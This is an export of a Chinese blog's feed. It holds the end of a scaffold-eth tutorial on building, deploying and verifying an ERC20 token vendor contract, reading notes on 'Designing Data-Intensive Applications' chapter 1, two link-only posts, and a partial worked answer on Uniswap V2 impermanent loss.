class="line">    uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">    if (currentAllowance != type(uint256).max) &#123;</span><br><span class="line">        require(currentAllowance &gt;= amount, &quot;ERC20: insufficient allowance&quot;);</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _approve(owner, spender, currentAllowance - amount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev Moves `amount` of tokens from `sender` to `recipient`.</span><br><span class="line"> *</span><br><span class="line"> * This internal function is equivalent to &#123;transfer&#125;, and can be used to</span><br><span class="line"> * e.g. implement automatic token fees, slashing mechanisms, etc.</span><br><span class="line"> *</span><br><span class="line"> * Emits a &#123;Transfer&#125; event.</span><br><span class="line"> *</span><br><span class="line"> * Requirements:</span><br><span class="line"> *</span><br><span class="line"> * - `from` cannot be the zero address.</span><br><span class="line"> * - `to` cannot be the zero address.</span><br><span class="line"> * - `from` must have a balance of at least `amount`.</span><br><span class="line"> */</span><br><span class="line">function _transfer(</span><br><span class="line">    address from,</span><br><span class="line">    address to,</span><br><span class="line">    uint256 amount</span><br><span class="line">) internal virtual &#123;</span><br><span class="line">    require(from != address(0), &quot;ERC20: transfer from the zero address&quot;);</span><br><span class="line">    require(to != address(0), &quot;ERC20: transfer to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">    _beforeTokenTransfer(from, to, amount);</span><br><span class="line"></span><br><span class="line">    uint256 fromBalance = _balances[from];</span><br><span class="line">    require(fromBalance &gt;= amount, &quot;ERC20: transfer amount exceeds balance&quot;);</span><br><span class="line">    unchecked &#123;</span><br><span class="line">        _balances[from] = fromBalance - amount;</span><br><span class="line">    &#125;</span><br><span class="line">    _balances[to] += amount;</span><br><span class="line"></span><br><span class="line">    emit Transfer(from, to, amount);</span><br><span class="line"></span><br><span class="line">    _afterTokenTransfer(from, to, amount);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev See &#123;IERC20-transferFrom&#125;.</span><br><span class="line"> *</span><br><span class="line"> * Emits an &#123;Approval&#125; event indicating the updated allowance. This is not</span><br><span class="line"> * required by the EIP. See the note at the beginning of &#123;ERC20&#125;.</span><br><span class="line"> *</span><br><span class="line"> * NOTE: Does not update the allowance if the current allowance</span><br><span class="line"> * is the maximum `uint256`.</span><br><span class="line"> *</span><br><span class="line"> * Requirements:</span><br><span class="line"> *</span><br><span class="line"> * - `from` and `to` cannot be the zero address.</span><br><span class="line"> * - `from` must have a balance of at least `amount`.</span><br><span class="line"> * - the caller must have allowance for ``from``&#x27;s tokens of at least</span><br><span class="line"> * `amount`.</span><br><span class="line"> */</span><br><span class="line">function transferFrom(</span><br><span class="line">    address from,</span><br><span class="line">    address to,</span><br><span class="line">    uint256 amount</span><br><span class="line">) public virtual override returns (bool) &#123;</span><br><span class="line">    address spender = _msgSender();</span><br><span class="line">    _spendAllowance(from, spender, amount);</span><br><span class="line">    _transfer(from, to, amount);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>transferFrom</code> 函数中，先使用 <code>_spendAllowance</code> 进行授权数量检查并更新授权数量，然后再使用 <code>_transfer</code> 进行代币划转，而 <code>_spendAllowance</code> 中正是调用了 <code>allowance</code> 这个函数。</p><h3><span id="he-yue-shi-xian">合约实现</span></h3><p>合约的函数实现如下：</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">  event <span class="title class_">SellTokens</span>(address seller, uint256 amountOfTokens, uint256 amountOfETH);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 允许用户使用代币换回 ETH</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">sellTokens</span>(<span class="params">uint256 amountToSell</span>) <span class="keyword">public</span> &#123;</span><br><span class="line">    <span class="comment">// 价差是否合理</span></span><br><span class="line">    <span class="built_in">require</span>(amountToSell &gt; <span class="number">0</span>, <span class="string">&quot;Amount to sell must be greater than 0&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 检查用户是否有足够的代币</span></span><br><span class="line">    uint256 userBalance = yourToken.<span class="title function_">balanceOf</span>(msg.<span class="property">sender</span>));</span><br><span class="line">    <span class="built_in">require</span>(userBalance &gt;= amountToSell, <span class="string">&quot;Not enought tokens&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查承销商是否有足够的 ETH</span></span><br><span class="line">    uint256 amountOfEthNeeded = amountToSell / tokensPerEth;</span><br><span class="line">    uint256 venderBalance = <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>;</span><br><span class="line">    <span class="built_in">require</span>(amountOfEthNeeded &lt;= venderBalance, <span class="string">&quot;Not enought ether&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用户发送代币给承销商</span></span><br><span class="line">    bool sent =  yourToken.<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), amountToSell);</span><br><span class="line">    <span class="built_in">require</span>(sent, <span class="string">&quot;Failed to transfer tokens from seller to vender&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 承销商发送 ETH 给用户</span></span><br><span class="line">    (bool sent, ) = msg.<span class="property">sender</span>.<span class="property">call</span>&#123;<span class="attr">value</span>: amountOfEthNeeded&#125;(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">require</span>(sent, <span class="string">&quot;Failed to send ether from vender to seller&quot;</span>);</span><br><span class="line"></span><br><span class="line">    emit <span class="title class_">SellTokens</span>(msg.<span class="property">sender</span>, amountToSell, amountOfEthNeeded);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="bu-shu-he-yue">部署合约</span></h3><p>我们再次部署新的合约：</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line">$ yarn deploy --reset</span><br><span class="line"><span class="title class_">Compiling</span> <span class="number">7</span> files <span class="keyword">with</span> <span class="number">0.8</span><span class="number">.6</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Generating</span> typings <span class="attr">for</span>: <span class="number">7</span> artifacts <span class="keyword">in</span> <span class="attr">dir</span>: ../vite-app-ts/src/generated/contract-types <span class="keyword">for</span> <span class="attr">target</span>: ethers-v5</span><br><span class="line"><span class="title class_">Successfully</span> generated <span class="number">15</span> typings!</span><br><span class="line"><span class="title class_">Compilation</span> finished successfully</span><br><span class="line">deploying <span class="string">&quot;YourToken&quot;</span> (<span class="attr">tx</span>: <span class="number">0xd087814faeb6a8f1a7205d443550419b68d252bcd071e30c7965844105b761ac</span>)...: deployed at <span class="number">0x68B1D87F95878fE05B998F19b66F4baba5De1aed</span> <span class="keyword">with</span> <span class="number">639137</span> gas</span><br><span class="line">deploying <span class="string">&quot;Vendor&quot;</span> (<span class="attr">tx</span>: <span class="number">0xafaf257948f8c87e0a836eac6e2bbc1ec38026a5c2a0dfc0f71823a4ace635fd</span>)...: deployed at <span class="number">0x3Aa5ebB10DC797CAC828524e59A333d0A371443c</span> <span class="keyword">with</span> <span class="number">694098</span> gas</span><br><span class="line"></span><br><span class="line"> 🏵  <span class="title class_">Sending</span> all <span class="number">1000</span> tokens to the vendor...</span><br></pre></td></tr></table></figure><p>此时，合约地址变为：</p><ul><li>承销商合约地址： <code>0x3Aa5ebB10DC797CAC828524e59A333d0A371443c</code></li><li>代币地址： <code>0x68B1D87F95878fE05B998F19b66F4baba5De1aed</code></li></ul><h3><span id="yan-zheng">验证</span></h3><p>验证过程需要包含两步：</p><ol><li><p>先在 Debug 页面使用代币的 <code>approve</code> 允许承销商合约处理 10 个代币：</p><p><img src="https://user-images.githubusercontent.com/3297411/155913525-657975ef-e67c-4df6-bf03-36eff6801d7e.png" alt="approve"></p><p>在 <code>编辑权限</code> 中，我们可以查看到授权的代币数量：</p><p><img src="https://user-images.githubusercontent.com/3297411/155913530-117ea47b-8000-4f8c-be5c-cd21a118ed04.png" alt="approveAmount"></p></li><li><p>使用承销商的 <code>sellTokens</code> 将 10 个代币换成 ETH。如果上一步没有使用 <code>approve</code> 的话，程序会报错。</p><p><img src="https://user-images.githubusercontent.com/3297411/155913537-c085ad8b-295b-42b8-8755-ae9a43eec4e9.png" alt="sellTokens"></p></li></ol><p>到这一步，我们就完成了合约的编写。</p><h2><span id="wu-bu-shu-dao-ce-shi-wang-luo">五、部署到测试网络</span></h2><p>我们将部署合约到测试网络中，使用的测试网络是 <code>rinkeby</code> ：</p><ol><li>修改以下变量为 <code>rinkeby</code> ：<ol><li><code>packages/hardhat-ts/hardhat.config.ts</code> 的 <code>defaultNetwork</code> 变量，</li><li><code>packages/vite-app-ts/src/config/providersConfig.ts</code> 中的 <code>targetNetworkInfo</code> 变量</li></ol></li><li>查看可用账户： <code>yarn account</code> ，如果没有找到可用账户，则使用 <code>yarn generate</code> 生成；</li><li>使用 <a href="https://faucet.paradigm.xyz/">faucet.paradigm.xyz</a> 获取一些测试用的的 ETH，可以使用对应的区块浏览器查看账户情况，比如 <a href="https://rinkeby.etherscan.io/">https://rinkeby.etherscan.io/</a>，当我们完成测试用币的申请之后，我们可以看到账户余额为 0.1ETH；</li><li>再次使用 <code>yarn deploy</code> 进行合约部署：</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ yarn deploy</span><br><span class="line">Nothing to compile</span><br><span class="line">No need to generate any newer typings.</span><br><span class="line">deploying <span class="string">&quot;YourToken&quot;</span> (tx: 0xa7a89a2917cfa355d1305643dc89f54d776186c0059977b0a237737fa37dff62)...: deployed at 0x0F0D10eF3589cE896E9E54E09568cB7a5371e398 with 639137 gas</span><br><span class="line">deploying <span class="string">&quot;Vendor&quot;</span> (tx: 0x3a1f02b77de29704a16599067c8e10abb0da78e547ea0eea8200761da5d45715)...: deployed at 0xb335Fc61D759C041503dC17266575229E593DE17 with 694098 gas</span><br><span class="line"></span><br><span class="line"> 🏵  Sending all 1000 tokens to the vendor...</span><br></pre></td></tr></table></figure><p>可以看到，合约部署成功，此时我们可以在线上测试网络查看到具体的合约部署情况：</p><ul><li>GLD 合约地址：<a href="https://rinkeby.etherscan.io/address/0x0F0D10eF3589cE896E9E54E09568cB7a5371e398">https://rinkeby.etherscan.io/address/0x0F0D10eF3589cE896E9E54E09568cB7a5371e398</a></li><li>承销商合约地址： <a href="https://rinkeby.etherscan.io/address/0xb335Fc61D759C041503dC17266575229E593DE17">https://rinkeby.etherscan.io/address/0xb335Fc61D759C041503dC17266575229E593DE17</a></li></ul><p>并且部署完成了初始化代币分发和所有权转换。详情可以查看部署账户信息： <a href="https://rinkeby.etherscan.io/address/0xccb20d43f62f31dd94436f04a1e90d7d08569e57">https://rinkeby.etherscan.io/address/0xccb20d43f62f31dd94436f04a1e90d7d08569e57</a>。</p><h2><span id="liu-fa-bu">六、发布</span></h2><p>接下来，我们将发布我们的前端项目到 Surge （或者使用 s3， ipfs 上）。<a href="http://Surge.sh">Surge.sh</a> 提供了免费的网站的部署，对于我们的测试网站来时再合适不过。</p><ol><li>编译前端项目： <code>yarn build</code></li><li>将项目发布到 surge 上： <code>yarn surge</code></li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ yarn surge</span><br><span class="line"></span><br><span class="line">   Welcome to surge! (surge.sh)</span><br><span class="line">   Login (or create surge account) by entering email &amp; password.</span><br><span class="line"></span><br><span class="line">          email: qwh005007@gmail.com</span><br><span class="line">       password: </span><br><span class="line"></span><br><span class="line">   Running as qwh005007@gmail.com (Student)</span><br><span class="line"></span><br><span class="line">        project: ./dist</span><br><span class="line">         domain: qiwihui-scaffold-2.surge.sh</span><br><span class="line">         upload: [====================] 100% eta: 0.0s (83 files, 16080214 bytes)</span><br><span class="line">            CDN: [====================] 100%</span><br><span class="line">     encryption: *.surge.sh, surge.sh (57 days)</span><br><span class="line">             IP: 138.197.235.123</span><br><span class="line"></span><br><span class="line">   Success! - Published to qiwihui-scaffold-2.surge.sh</span><br></pre></td></tr></table></figure><p>Surge 在运行命令的过程中就设置了账户名称，以及可以自定义域名：<a href="http://qiwihui-scaffold-2.surge.sh">qiwihui-scaffold-2.surge.sh</a>，当完成部署之后，我们就可以在浏览器中访问这个页面，和我们本地运行的结果是一致的。</p><h2><span id="qi-he-yue-yan-zheng">七、合约验证</span></h2><p>当我们向测试网络部署合约时，部署的是合约编译之后的字节码，合约源码不会发布。实际生产中，有时我们需要发布我们的源代码，以保证我们的代码真实可信。此时，我们就可以借助 etherscan 提供的功能进行验证。</p><ol><li><p>首先，我们获取 etherscan 的 API key，地址为 <a href="https://etherscan.io/myapikey">https://etherscan.io/myapikey</a>，比如 <code>PSW8C433Q667DVEX5BCRMGNAH9FSGFZ7Q8</code> ；</p></li><li><p>更新 <code>packages/hardhat-ts/package.json</code> 中对应的 api-key 参数：</p> <figure class="highlight json"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="attr">&quot;send&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hardhat send&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;generate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hardhat generate&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;account&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hardhat account&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;etherscan-verify&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hardhat etherscan-verify --api-key PSW8C433Q667DVEX5BCRMGNAH9FSGFZ7Q8&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p>由于项目中的一个 bug，需要在根目录下的 <code>packages.json</code> 中添加以下命令才能直接使用之后的命令：</p> <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;verify&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yarn workspace @scaffold-eth/hardhat etherscan-verify&quot;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure></li><li><p>运行 <code>yarn verify --network rinkeby</code> ，这个命令将通过 etherscan 接口进行合约验证，输出结果为：</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ yarn verify --network rinkeby</span><br><span class="line">verifying Vendor (0xb335Fc61D759C041503dC17266575229E593DE17) ...</span><br><span class="line">waiting <span class="keyword">for</span> result...</span><br><span class="line"> =&gt; contract Vendor is now verified</span><br><span class="line">verifying YourToken (0x0F0D10eF3589cE896E9E54E09568cB7a5371e398) ...</span><br><span class="line">waiting <span class="keyword">for</span> result...</span><br><span class="line"> =&gt; contract YourToken is now verified</span><br></pre></td></tr></table></figure></li><li><p>验证完成后，我们可以看到 etherscan 中的合约页面已经加上了一个蓝色小钩，在合约中，也可以看到我们合约的源代码：</p><p><img src="https://user-images.githubusercontent.com/3297411/155913533-362162f2-eede-47f6-9c97-6f6e34bc9a70.png" alt="contractVerified"></p></li></ol><p>至此，我们就完成了合约的验证。</p><h2><span id="ba-ti-jiao-jie-guo">八、提交结果</span></h2><p>最后，当我们完成上述的所有步骤之后，我们可以将我们的结果提交到 <a href="https://speedrunethereum.com/">speedrunethereum.com</a> 上，选择对应的挑战，并提交部署的前端地址和承销商合约的链接即可：</p><p><img src="https://user-images.githubusercontent.com/3297411/155913539-e7c60b5c-261d-488d-a517-0218bf415aa5.png" alt="submitChallenge"></p><p>Congratulations! 你已经完成了这个教程</p><h2><span id="zong-jie">总结</span></h2><p>通过篇教程，我们可以学习到如下内容：</p><ol><li>合约 <code>approve</code> 和 <code>transferFrom</code> 的使用；</li><li>如何使用 OpenZeppelin 创建 ERC20 代币；</li><li>创建承销商合约实现用户对代币的买卖；</li><li>在测试网路 Rinkeby 上部署合约；</li><li>在 <a href="http://Surge.sh">Surge.sh</a> 上部署前端项目；</li><li>在 etherscan 上查看合约以及验证合约；</li><li>以及关于 web3 开发的知识，包括 hardhat，react 等。</li></ol><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      如何创建一个代币承销商 dApp
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="区块链" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>《数据密集型应用的设计》读书笔记──第一章：可靠性，可扩展性，可维护性</title>
    <link href="https://qiwihui.com/qiwihui-blog-143/"/>
    <id>https://qiwihui.com/qiwihui-blog-143/</id>
    <published>2024-05-15T02:25:31.339Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="di-yi-zhang-ke-kao-xing-ke-kuo-zhan-xing-ke-wei-hu-xing">第一章：可靠性，可扩展性，可维护性</span></h1><p>数据密集型（data-intensive）而非计算密集型（compute-intensive）：</p><ul><li>数据量、数据复杂性、以及数据的变更速度</li><li>数据密集型应用基本组件<ul><li>存储数据，以便自己或其他应用程序之后能再次找到 （<strong><em>数据库（database）</em></strong>）</li><li>记住开销昂贵操作的结果，加快读取速度（<strong><em>缓存（cache）</em></strong>）</li><li>允许用户按关键字搜索数据，或以各种方式对数据进行过滤（<strong><em>搜索索引（search indexes）</em></strong>）</li><li>向其他进程发送消息，进行异步处理（<strong><em>流处理（stream processing）</em></strong>）</li><li>定期处理累积的大批量数据（<strong><em>批处理（batch processing）</em></strong>）</li></ul></li><li>一个可能的组合使用多个组件的数据系统架构：</li></ul><p><img src="https://user-images.githubusercontent.com/3297411/125434927-f4ac7199-069a-4bd5-8ed8-b5748a1b97da.png" alt="Untitled"></p><p>影响数据系统设计的因素很多，包括参与人员的技能和经验、历史遗留问题、系统路径依赖、交付时限、公司的风险容忍度、监管约束等。</p><p>重要的三个问题；</p><ul><li><p><strong><em>可靠性（Reliability）</em></strong></p><p>系统在<strong>困境（adversity）</strong>（硬件故障、软件故障、人为错误）中仍可正常工作（正确完成功能，并能达到期望的性能水准）。</p></li><li><p><strong><em>可扩展性（Scalability）</em></strong></p><p>有合理的办法应对系统的增长（数据量、流量、复杂性）。</p></li><li><p><strong><em>可维护性（Maintainability）</em></strong></p><p>随着时间的推移，许多新的人员参与到系统开发和运维， 以维护现有功能或适配 新场景等，系统都应高效运转。</p></li></ul><h2><span id="ke-kao-xing">可靠性</span></h2><p>期望:</p><ul><li>应用程序执行用户所期望的功能。</li><li>可以容忍用户出现错误或者不正确的软件使用方怯 。</li><li>性能可以应对典型场 景 、 合 理负载压力和数据 量。</li><li>系统可防止任何未经授权的访问和滥用。</li></ul><p>故障（fault）和失效（failure）：</p><ul><li>故障：系统的一部分状态偏离其标准；</li><li>失效：系统作为一个整体停止向用户提供服务。</li><li>由于出现fault的几率不可能为0，因此倾向于设计fault-tolerant而不是fault-preventing的系统。</li></ul><h3><span id="ying-jian-gu-zhang">硬件故障</span></h3><ul><li>随机的、相互独立的</li><li>计算机系统中的硬盘、内存、power grid等零件都可能出问题，这可以通过增加单个硬件的冗余度（redundancy）来减少整个系统宕机的概率；</li><li>随着数据量和应用计算需求的增加，增加设备冗余也无法解决，就需要考虑如何在某个机器宕机的情况下通过软件调度来防止整个服务崩溃。</li></ul><h3><span id="ruan-jian-gu-zhang">软件故障</span></h3><ul><li>系统性错误的BUG难以预料，通常在异常情况被触发，例如Linux内核的润秒BUG；</li><li>没有快速解决办法，只能在实现时：<ul><li>认真检查依赖的假设条件与系统之间交互</li><li>进行全面的测试</li><li>进程隔离</li><li>允许进程崩愤并自动重启</li><li>反复评估</li><li>监控井分析生产环节的行为表现</li></ul></li></ul><h3><span id="ren-wei-gu-zhang">人为故障</span></h3><ul><li>人类是不可靠的，操作人员的不当操作占系统崩溃的75%～90%</li><li>如何降低：<ul><li>以最小出错的方式来设计系统；</li><li>想办住分离最容易出错的地方、容易引发故障的接口，提供sandbox让他们熟悉使用方法，随意犯错而不会影响生产；</li><li>充分的测试：unit/integration/manual；</li><li>当出现人为失误时，提供快速的恢复机制以尽量减少故障影响；</li><li>设置详细而清晰的监控子系统，包括性能指标和错误率；</li><li>推行管理流程井加以培训。</li></ul></li></ul><h2><span id="ke-kuo-zhan-xing"><strong><em>可扩展性</em></strong></span></h2><p>系统不见得一直可靠，比如负载增加，系统需要持续变化。</p><h3><span id="heng-liang-fu-zai-load">衡量负载（Load）</span></h3><ul><li>根据系统特性简洁描述，例如服务器的每秒请求处理次数，数据库读写比例，用户数量， 缓存命中率</li><li>Twitter例子<ul><li>需求<ul><li>用户发推(avg 4.6k RPS，max 12k RPS)</li><li>查看个人主页时间线(300k RPS)</li></ul></li><li>挑战：如何快速为用户提供timeline。<ol><li>直接从数据库读查询，涉及join，在请求多的时候数据库无法处理；</li><li>考虑为每个用户维护时间线的缓存，只是发推的时候就需要更新对应用户的缓存；</li><li>混合：由于发推的RPS远小于查询，缓存的方法对读更有优势，但是对于follower众多的大号，发推需要写入的缓存可能非常多，因此可以考虑针对这种大号直接写入数据库，在时间线单独从数据库读大号的推。</li></ol></li></ul></li></ul><h3><span id="heng-liang-xing-neng-performance">衡量性能（Performance）</span></h3><ul><li>两个问题：<ul><li>增加负载参数并保持系统资源（CPU、内存、网络带宽等）不变时，系统性能将受到什么影响？</li><li>增加负载参数并希望保持性能不变时，需要增加多少系统资源？</li></ul></li><li>吞吐量（throughput）：每秒可以处理的记录数量，或者在特定规模数据集上运行作业的总时间；</li><li>响应时间（response time）和延迟（latency）<ul><li>响应时间：网络延迟 + queuing + service time</li><li>延迟：请求花费在处理上的时间。</li></ul></li><li>百分位数（Percentile）：<ul><li>响应时间如果直接数学平均，无法反映大致有多少请求受到影响</li><li>p95, p99, p999表示有95%, 99%, 99.9%的请求的响应时间快于某个值。</li></ul></li><li>尾部延迟（tail latencies）：响应时间的高百分位点有时也很重要<ul><li>对于Amazon，大客户请求的数据量大，响应时间也就更长，不能不关注。</li></ul></li><li>SLO/SLA: Service Level Objective/Agreements, 用百分位数来判断系统是否可用。</li><li>测试时负载生成独立于响应时间来持续发送请求，不能等到收到响应才轰下一个请求。</li></ul><h3><span id="ying-dui-fu-zai-zeng-jia-de-fang-fa">应对负载增加的方法</span></h3><ul><li>纵向扩展（scaling up）（垂直扩展（vertical scaling），转向更强大的机器）</li><li>横向扩展（scaling out） （水平扩展（horizontal scaling），将负载分布到多台小机器上）</li></ul><h2><span id="ke-wei-hu-xing">可维护性</span></h2><p>软件开发本身开销并不算大，日后的维护升级需要花费更多。</p><p>软件系统的三个设计原则：</p><ul><li><p>可运维性（Operability）</p><p>方便运营团队来保持系统平稳运行。</p></li><li><p>简单性（Simplicity）简化系统复杂性，使新工程师能够轻松理解系统。注意这与用户界面的简单性并不一样。</p></li><li><p>可演化性（Evolvability）后续工程师能够轻松地对系统进行改进，井根据需求变化将其适配到非典型场景，也称为可延伸性、易修改性或可塑性。</p></li></ul><h3><span id="ke-yun-wei-xing">可运维性</span></h3><ul><li>良好的监控</li><li>自动化</li><li>避免依赖单台机器</li><li>良好的文档和易于理解的操作模型</li><li>默认行为和可覆盖</li><li>自我修复</li><li>行为可预测</li><li>其他<ul><li>适当的日志来跟踪出问题（系统故障或性能下降）的根源</li><li>保证系统能升级，尤其是安全补丁</li><li>正确的配置</li><li>开发时遵循最佳实践</li></ul></li></ul><h3><span id="jian-dan-xing">简单性</span></h3><p>保证代码简洁，让新加入的码农也能理解代码。一个很有效的方法是抽象，用高级类来描述统一的行为。</p><ul><li>防止状态空间爆炸</li><li>让系统中的模块尽量解耦，减少依赖</li><li>保证一致的命名</li><li>减少短视的hacks</li></ul><h3><span id="ke-yan-hua-xing">可演化性</span></h3><p>方便后续重构、加入新功能那个，与前面的简单性息息相关。</p><ul><li>敏捷工作模式比较方便改变</li><li>TDD：测试驱动开发</li></ul><h2><span id="can-kao">参考</span></h2><ul><li><a href="https://bobbyliujb.github.io/2020/01/14/designing_data_intensive_app/">https://bobbyliujb.github.io/2020/01/14/designing_data_intensive_app/</a></li></ul><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      《数据密集型应用的设计》读书笔记──第一章：可靠性，可扩展性，可维护性
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="读书笔记" scheme="https://qiwihui.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Babylon 质押协议</title>
    <link href="https://qiwihui.com/qiwihui-blog-174/"/>
    <id>https://qiwihui.com/qiwihui-blog-174/</id>
    <published>2024-05-15T02:25:31.335Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>video: <a href="https://youtu.be/xX6plmRB4hg">https://youtu.be/xX6plmRB4hg</a></p><p>docs: <a href="https://qiwihui.notion.site/Babylon-bitcoin-staking-protocol-b07554e575424f13b3ddf240bbbf2657?pvs=4">https://qiwihui.notion.site/Babylon-bitcoin-staking-protocol-b07554e575424f13b3ddf240bbbf2657?pvs=4</a></p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Babylon 质押协议
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="区块链" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Bitcoin 铭文原理</title>
    <link href="https://qiwihui.com/qiwihui-blog-173/"/>
    <id>https://qiwihui.com/qiwihui-blog-173/</id>
    <published>2024-05-15T02:25:31.316Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>video: <a href="https://youtu.be/ADaKhkkQa_E">https://youtu.be/ADaKhkkQa_E</a></p><p>docs: <a href="https://qiwihui.notion.site/Bitcoin-08d37baeabce47fcb72f6195bb38a25c?pvs=4">https://qiwihui.notion.site/Bitcoin-08d37baeabce47fcb72f6195bb38a25c?pvs=4</a></p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Bitcoin 铭文原理
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="区块链" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>CS251 - final 2021 - 问题 3</title>
    <link href="https://qiwihui.com/qiwihui-blog-156/"/>
    <id>https://qiwihui.com/qiwihui-blog-156/</id>
    <published>2024-05-15T02:25:31.314Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p><strong><em>问题3（20分）: Automated market maker (AMM).</em></strong></p><p><em>你作为Uniswap V2的流动性提供者，为DAI/ETH池贡献5个ETH及5000个DAI。假设1个DAI值1美元，那么你的出资总额为1万美元。</em></p><p><em>A)    几个月后，1个ETH的价格上升到2000 DAI。在DAI/ETH池适应这个新的汇率稳定下来以后，您决定撤回作为流动性提供者的全部份额。假设系统不收费(∅= 1)，你会收到多少ETH和DAI ?</em></p><span id="more"></span><p><strong>答：</strong> 假设初始时流动性池中 ETH 和 DAI 的数量为$x$，$y$，提供的<em>5个 ETH 和5000个 DAI</em> 流动性占比为 $w$，则此时边际价格（marginal price）为$M_p=\frac{y}{x}=\frac{5000}{5}=1000$；</p><p>设价格变化之后流动性池中 ETH 和 DAI 的数量为 $x’$，$y’$，则有 $M_p’=\frac{y’}{x’}=2000=2M_p$；</p><p>根据恒定乘积公式 $xy=x’y’=k$，以及 $M_p=\frac{y}{x}$，$M_p’=\frac{y’}{x’}$，可以推出：</p><p>$x’=\sqrt{\frac{k}{M_p’}}=\sqrt{\frac{k}{2M_p}}=\frac{1}{\sqrt{2}}x$，$y’=\sqrt{2kM_p’}=\sqrt{2}y$，</p><p>由于流动性占比不变，所以取回的 ETH 为 $wx’=\frac{1}{\sqrt{2}}wx=5\frac{1}{\sqrt{2}}=3.5355$，DAI 为 $wy’=\sqrt{2}wy=5000\sqrt{2}=7071.0678$</p><p>故可以收到 3.5355 ETH 和 7071.0678 DAI</p><p><em>B)    如果你自己持有你的5 ETH和5000 DAI，你的资产现在将价值15K DAI，获取了5000 DAI的利润。在这几个月里，作为Uniswap V2的流动性提供者，与“自己持有”策略相比，你的损失是多少? 将损失以美元的绝对值表示，假设1 DAI = 1 USD。这被称为暂时性损失，尽管在这种情况下，这种损失是相当永久性的。</em></p><p><strong>答：</strong> 按目前的价格，收回的 ETH 和 DAI 的价值为 $3.5355*2000+7071.0678=14142.0678$，损失为 $15000-14142.0678=857.9322$，损失率为 $\frac{857.9322}{15000}=0.057=5.7%$，故损失 857.9322 USD。</p><p><em>C)    如果您因担任Uniswap V2的流动性提供者而损失了x美元，Uniswap V2是用部分（b）计算x的，那么这些资金流向了哪里？具体来说，就是谁在这个过程中获得了x美元？</em></p><p><strong>答：</strong> 这些损失将会由套利交易者获得。当外部 ETH 价格上升时，套利交易者会通过向 